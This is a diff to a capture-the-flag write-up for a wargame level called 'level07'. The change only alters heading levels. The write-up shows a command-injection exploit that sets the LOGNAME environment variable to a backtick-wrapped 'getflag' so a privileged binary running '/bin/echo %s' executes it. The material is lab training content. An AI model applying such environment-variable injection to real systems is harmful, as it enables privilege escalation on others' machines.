@@ -13,13 +13,13 @@ string level07
 	/bin/echo %s 
 ```
 
-# to exploit then we need to change the value of env LOGNAME "LOGNAME=level07"
+## to exploit then we need to change the value of env LOGNAME "LOGNAME=level07"
 
 ```bash
 	export LOGNAME=\`getflag\`
 ```
 
-# finally execute level07 script
+## finally execute level07 script
 
 ./level07
 
